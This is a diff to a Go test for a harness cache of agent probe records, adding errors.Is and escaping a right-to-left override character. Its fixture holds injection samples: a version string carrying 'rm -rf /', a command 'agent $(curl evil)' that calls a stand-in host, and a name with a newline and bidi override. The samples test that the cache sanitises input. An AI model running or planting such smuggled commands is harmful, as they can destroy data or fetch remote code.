@@ -2,6 +2,7 @@ package harness
 
 import (
 	"encoding/json"
+	"errors"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -124,7 +125,7 @@ func TestCacheCleansRecords(t *testing.T) {
 		t.Error("a path stored as identity")
 	}
 	r := ProbeRecord{ID: "ok", Identity: identity("x"), Status: ProbeOK, Code: "Code with /path", Version: "1.2.3; rm -rf /", ProbedAt: time.Now(),
-		ACP: &ACPInfo{AgentName: "evil\nsecond‮"},
+		ACP: &ACPInfo{AgentName: "evil\nsecond\u202e"},
 		SignIn: []SignIn{{Method: "a", Type: "terminal", Name: "x", Command: "agent $(curl evil)"},
 			{Method: "b", Type: "weird", Name: "y"}}}
 	if err := s.Put(r); err != nil {
@@ -161,7 +162,7 @@ func TestCacheCorruptIsRebuilt(t *testing.T) {
 	}
 	if runtime.GOOS != "windows" {
 		_ = os.Chmod(filepath.Join(s.Dir, CacheFile), 0o644)
-		if err := s.Check(); err != ErrCacheUnsafe {
+		if err := s.Check(); !errors.Is(err, ErrCacheUnsafe) {
 			t.Errorf("check of a 0644 cache: %v", err)
 		}
 	}
